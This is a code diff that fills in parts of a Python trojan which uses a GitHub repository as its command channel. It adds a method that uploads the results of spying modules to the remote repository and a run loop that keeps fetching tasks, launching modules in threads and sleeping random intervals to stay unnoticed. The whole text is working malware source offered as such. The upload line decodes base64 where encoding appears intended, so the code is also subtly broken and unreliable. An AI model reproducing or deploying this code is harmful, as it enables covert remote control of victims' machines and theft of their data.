@@ -21,12 +21,16 @@ def get_file_contents(dirname,module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
 
 #create trojan class to performs trojaning task
+#create trojan object
 class Trojan:
     #function init
     def __init__(self,id):
         self.id = id
+        #assign the configuration
         self.config_file = f'{id}.json'
+        #assign where trojan will write its output
         self.data_path = f'data/{id}/'
+        #make connection to repositori
         self.repo = github_connect()
 
     #function get configuration
@@ -49,7 +53,21 @@ class Trojan:
         self.store_module_result(result)
 
     def store_module_result(self, data):
-        pass
+        message = datetime.now().isoformat()
+        remote_path = f'data/{self.id}/{message}.data'
+        binarydata = bytes('%r' % data, 'utf8')
+        self.repo.create_file(
+            remote_path, message, base64.b64decode(binarydata)
+        )
 
     def run(self):
-        pass
+        while True:
+            config = self.get_config()
+            for task in config:
+                thread = threading.Thread(
+                    target=self.module_runner,
+                    args=(task['module'],)
+                )
+                thread.start()
+                time.sleep(random.randint(1, 10))
+            time.sleep(random.randint(30*60, 3*60*60))
